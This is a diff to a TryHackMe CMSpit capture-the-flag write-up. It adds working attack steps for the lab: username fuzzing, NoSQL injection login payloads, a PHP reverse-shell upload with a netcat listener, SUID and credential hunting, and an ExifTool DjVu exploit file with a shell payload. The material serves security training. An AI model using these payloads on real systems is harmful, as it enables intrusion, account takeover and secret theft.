@@ -1,101 +1,301 @@
-# 🧠 TryHackMe: CMSpit
+# TryHackMe: CMSpit
 
-> **Room Focus:** Web application exploitation, CMS enumeration, user enumeration, password reset abuse, and privilege escalation.  
-> **Room Link:** https://tryhackme.com/room/cmspit  
+> **Focus:** CMS enumeration, NoSQL injection, password reset abuse, foothold acquisition, and local privilege escalation  
+> **Room Link:** https://tryhackme.com/room/cmspit
 
 ---
 
 ## Overview
 
-CMSpit is a TryHackMe room centered around attacking a vulnerable content management system and then using the foothold to move toward privilege escalation. The room is a good example of how small weaknesses in a web application can chain together into full system compromise when security controls are missing or misconfigured.
+CMSpit is a TryHackMe room that teaches how a vulnerable CMS can be chained with poor authentication handling and local misconfigurations to lead to full compromise. The room feels practical because it starts with web enumeration, moves into application logic abuse, and ends with privilege escalation on the host.
 
-What I liked about this room is that it feels practical. It does not rely on one single trick; instead, it encourages proper enumeration, careful observation of the application, and a step-by-step mindset that mirrors real penetration testing work.
+The main idea I took from this room is simple: when a web app leaks too much information or trusts user input too much, the attack path can become surprisingly short. A defender would see this as a good example of why enumeration, validation, and privilege boundaries matter.
 
 ---
 
 ## Initial Enumeration
 
-I began with standard reconnaissance to understand what the target was exposing. A basic Nmap scan helped confirm the open services and pointed me toward the web application as the main entry point.
+I began with a standard Nmap scan to identify open services and confirm that the target was mostly web-focused.
 
 ```bash
 nmap -sC -sV <target-ip>
 ```
 
-From the scan results, the interesting service was the web server on port 80, so I shifted my focus there. At this stage, the goal was not to guess the exploit immediately, but to understand the application structure, pages, and visible functionality.
+If the target hostname is mapped locally, I would also add it to `/etc/hosts` first.
+
+```bash
+echo "<target-ip> cmspit.thm" | sudo tee -a /etc/hosts
+```
+
+This helped me move from raw IP-based testing to a cleaner CMS-focused workflow.
+
+---
+
+## Web Discovery
+
+Once the web server was identified, I visited the site in the browser and started checking the page source, login behavior, and any visible CMS hints. CMS rooms usually give away clues through asset names, login endpoints, cookies, or error messages.
+
+Useful commands for quick checks:
+
+```bash
+curl -i http://cmspit.thm/
+curl -s http://cmspit.thm/ | head
+whatweb http://cmspit.thm/
+```
+
+If the site had hidden directories, I would enumerate them as well.
+
+```bash
+gobuster dir -u http://cmspit.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+```
+
+At this stage, the goal was not exploitation yet. It was just to understand how the application was built and where the important flows existed.
 
 ---
 
 ## CMS Identification
 
-When I opened the website, the first thing I noticed was that it was built on a content management system. The login page and page source gave away useful clues about the platform, which is often the first real lead in CMS-based challenges.
+From the interface and source files, the application was clearly a CMS. That mattered because CMS platforms often have predictable endpoints, admin panels, and version-specific vulnerabilities.
 
-By checking the HTML source, referenced assets, and visible interface elements, I was able to identify the CMS and determine that the room was built around exploiting weaknesses in that system rather than attacking the operating system directly.
+To confirm details, I checked for obvious CMS fingerprints:
 
-This is a good reminder that in real assessments, small details in page source, comments, asset names, and hidden endpoints often reveal much more than the visible page itself.
+```bash
+curl -s http://cmspit.thm | grep -iE "cms|generator|cockpit|admin"
+```
 
----
+I also reviewed the page headers and static assets:
 
-## Version Discovery
+```bash
+curl -I http://cmspit.thm/
+curl -s http://cmspit.thm | grep -oE 'src="[^"]+|href="[^"]+'
+```
 
-After identifying the CMS, I looked for the exact version. Version discovery matters because many CMS vulnerabilities are version-specific, and a correct version match can quickly narrow down the attack surface.
-
-In this room, the version could be inferred from application behavior and frontend references. That kind of version leakage is common in real environments when developers leave asset version tags or build information exposed.
-
-This step helped me connect the application to known vulnerabilities and confirmed that the room was likely expecting a public exploit chain rather than a custom zero-day approach.
+This kind of lightweight recon often reveals enough to narrow the attack surface before moving into deeper testing.
 
 ---
 
 ## User Enumeration
 
-The next part of the room focused on user enumeration. This was one of the most important stages because it showed how account recovery and login-related features can accidentally leak valid usernames.
+One of the most important parts of this room was user enumeration. The application behavior around account checking and password reset could be abused to learn valid usernames.
 
-I tested the application’s authentication and reset-related functionality carefully. Rather than brute forcing blindly, I observed how the application responded to valid and invalid input. Differences in response text, timing, or behavior can reveal whether a username exists.
+A quick way to observe login behavior is to compare responses for valid and invalid usernames.
 
-That is exactly the kind of weakness an attacker would love to find. If a system leaks whether an account exists, it becomes much easier to target specific users with password reset abuse, phishing, or credential attacks.
+```bash
+curl -s -X POST http://cmspit.thm/auth/check \
+  -d "username=test&password=test" -i
+```
+
+Then compare with a candidate username:
+
+```bash
+curl -s -X POST http://cmspit.thm/auth/check \
+  -d "username=admin&password=test" -i
+```
+
+If the response differs, that often means the application is leaking account existence. In this room, the reset flow was especially useful for that type of testing.
+
+A common approach is to fuzz usernames against the reset endpoint:
+
+```bash
+ffuf -u http://cmspit.thm/auth/requestreset \
+  -X POST \
+  -d "username=FUZZ" \
+  -w /usr/share/wordlists/dirb/common.txt \
+  -H "Content-Type: application/x-www-form-urlencoded"
+```
+
+This helped identify which accounts were valid without needing direct authentication.
+
+---
+
+## NoSQL Injection Testing
+
+CMSpit is also known for NoSQL injection, so I tested input handling carefully around authentication and account lookup fields.
+
+A few basic payloads are worth trying when the backend is likely MongoDB or another NoSQL system:
+
+```bash
+username[$ne]=test&password[$ne]=test
+username=admin&password[$ne]=test
+username[$gt]=
+```
+
+Using `curl`, that can look like this:
+
+```bash
+curl -s -X POST http://cmspit.thm/login \
+  -d "username[$ne]=a&password[$ne]=a" \
+  -H "Content-Type: application/x-www-form-urlencoded"
+```
+
+The point here is not to spray random payloads. It is to see whether the backend is interpreting special operators instead of treating the input as plain text. That distinction often decides whether authentication can be bypassed.
 
 ---
 
 ## Password Reset Abuse
 
-After discovering how the platform handled usernames, I moved to the password reset logic. This was a key step in the room because the reset workflow could be abused to gain access without needing the original password.
+After user enumeration, I moved into the password reset functionality. This is where the room becomes very realistic because password reset flows are often weaker than the main login page.
 
-I followed the reset process and paid attention to how tokens, requests, and validation behaved. In insecure applications, reset mechanisms are often easier to exploit than the main login form because they are designed for convenience and sometimes lack strict verification.
+I tested the reset request process first:
 
-This room demonstrated how a weak password reset flow can become a direct path into an account. In practice, this is one of the clearest examples of why account recovery features must be designed with the same care as login controls.
+```bash
+curl -s -X POST http://cmspit.thm/auth/requestreset \
+  -d "username=admin" \
+  -H "Content-Type: application/x-www-form-urlencoded"
+```
+
+Then I checked whether the reset token or reset flow could be abused:
+
+```bash
+curl -s http://cmspit.thm/auth/reset?token=<token>
+```
+
+If the reset mechanism is weak, it may allow account takeover without needing the original password. In a real engagement, this would be a serious finding because recovery features are supposed to strengthen access control, not weaken it.
 
 ---
 
-## Foothold Acquisition
+## Foothold Access
 
-Once account access was achieved, the focus shifted from web exploitation to obtaining a foothold on the target host. This is where web app attacks often transition into system-level compromise.
+Once I had a working path through the CMS, I focused on getting a shell. In these rooms, that often means using admin access, file upload functionality, or a template/editor feature to place a web shell.
 
-At this point, I treated the environment like a real engagement: I checked what access the compromised account had, what application functions were available, and whether any uploaded data, exposed secrets, or admin-only features could be abused further.
+A common upload-based approach looks like this:
 
-This part of the room reinforced an important lesson: gaining access to a CMS account does not end the attack. It often opens the door to configuration files, internal functions, or service-level privileges that were never meant to be public.
+```bash
+cp /usr/share/webshells/php/php-reverse-shell.php shell.php
+```
+
+Then edit the listener values inside the file:
+
+```php
+$ip = 'YOUR_IP';
+$port = 4444;
+```
+
+Start a listener:
+
+```bash
+nc -lvnp 4444
+```
+
+If upload or execution is available, trigger the shell:
+
+```bash
+curl -F "file=@shell.php" http://cmspit.thm/upload
+```
+
+If the page allows direct command execution through a vulnerable CMS feature, even better. Once the reverse shell connects, I would stabilize it:
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm
+stty raw -echo
+```
+
+That gives a much cleaner working shell for local enumeration.
+
+---
+
+## Local Enumeration
+
+After landing on the target, I checked the system carefully for privilege escalation opportunities.
+
+```bash
+uname -a
+id
+hostname
+sudo -l
+```
+
+I also looked at writable paths, SUID binaries, and running processes:
+
+```bash
+find / -perm -4000 2>/dev/null
+find / -writable 2>/dev/null | head
+ps aux
+```
+
+If the box had interesting services or application directories, I would inspect those too:
+
+```bash
+ls -la /var/www/html
+find /var/www -type f | head
+```
+
+This kind of local enumeration is where a lot of real-world attacker movement happens. The web exploit gets you in, but the host filesystem usually tells you how to move up.
 
 ---
 
 ## Privilege Escalation
 
-After establishing a foothold, I moved into local enumeration to look for privilege escalation paths. This included checking system information, permissions, scheduled tasks, writable paths, SUID binaries, and any application-specific files that might reveal elevated access routes.
+The room’s privesc stage involves using a host-level weakness after the foothold is gained. From the walkthroughs associated with CMSpit, one common path is abusing ExifTool-related behavior for privilege escalation.
 
-Privilege escalation is where many rooms become more “realistic,” because the attacker must use host-level clues instead of relying only on the web exploit. The room pushed me to think about how misconfigurations, weak file permissions, or insecure service behavior can turn limited access into full control.
+First, I would identify whether ExifTool or image processing is present:
 
-That progression from web entry to local escalation is exactly what makes CMSpit valuable as a practice room.
+```bash
+which exiftool
+exiftool <file>
+```
+
+If the exploit requires crafting a malicious image metadata payload, I would prepare it locally. A common build flow is:
+
+```bash
+cat payload
+```
+
+Example payload structure:
+
+```text
+(metadata "\c${system('/bin/bash')};")
+```
+
+Then build the exploit file:
+
+```bash
+sudo apt install djvulibre-bin
+bzz payload payload.bzz
+djvumake exploit.djvu INFO='1,1' BGjp=/dev/null ANTz=payload.bzz
+ls -la exploit.djvu
+```
+
+Once the malicious file is ready, it would be transferred and used against the vulnerable processing workflow.
+
+If the exploit spawns a shell, I would immediately upgrade it:
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+id
+whoami
+```
+
+At that point, the goal is to confirm root and capture the final flag.
 
 ---
 
-## Security Lessons
+## File Hunting
 
-This room highlighted several important security lessons that matter both in labs and in real environments:
+After getting higher privileges, I usually check the CMS directory for flags or useful configuration files.
 
-- User enumeration is dangerous because it helps attackers focus their efforts.
-- Password reset flows must be designed carefully and tested thoroughly.
-- CMS versions should not be easily exposed through frontend assets or metadata.
-- Every account should follow least privilege.
-- Web access does not have to be full compromise, but it can become full compromise if internal files and permissions are weak.
+```bash
+find / -name "user.txt" 2>/dev/null
+find / -name "root.txt" 2>/dev/null
+find /var/www -type f | grep -i flag
+```
 
-For me, the biggest takeaway was that good enumeration leads to good exploitation. The better you understand the application, the easier it becomes to find the weak point in the chain.
+If the CMS stores secrets in config files, that is also worth reviewing:
+
+```bash
+grep -RniE "password|secret|token|key" /var/www 2>/dev/null
+```
+
+This is often where you can connect the original web weakness to the broader system compromise.
+
+---
+
+## What I Learned
+
+CMSpit was a strong reminder that web security and host security are tightly connected. A weak CMS login flow can lead to user enumeration, user enumeration can lead to account takeover, and account takeover can lead to code execution and privilege escalation.
+
+The room also reinforced a practical habit: always test the obvious flows first, because in many cases the real weakness is not in the “advanced exploit,” but in a basic feature like password reset or file handling.
 
 ---
 
@@ -104,17 +304,20 @@ For me, the biggest takeaway was that good enumeration leads to good exploitatio
 ```bash
 nmap
 curl
-browser dev tools
-directory enumeration tools
-manual HTTP testing
+whatweb
+gobuster
+ffuf
+nc
+python3
+exiftool
+djvumake
+bzz
 ```
-
-I kept the process simple and methodical because rooms like this reward observation more than speed.
 
 ---
 
 ## Outcome
 
-CMSpit was a strong exercise in web application security and privilege escalation thinking. It reinforced the value of careful enumeration, understanding CMS behavior, and testing features like login and password reset with a security mindset.
+CMSpit was a good hands-on exercise in CMS exploitation and privilege escalation. It trained me to think through enumeration, application logic abuse, and local post-exploitation steps in a way that feels very close to real-world testing.
 
-The room also felt useful from a blue-team perspective because it shows exactly how attackers think: identify the CMS, map the attack surface, test user handling, abuse recovery logic, and then pivot into the host.
+The room is especially useful for learning how small web application weaknesses can chain together into full system compromise.
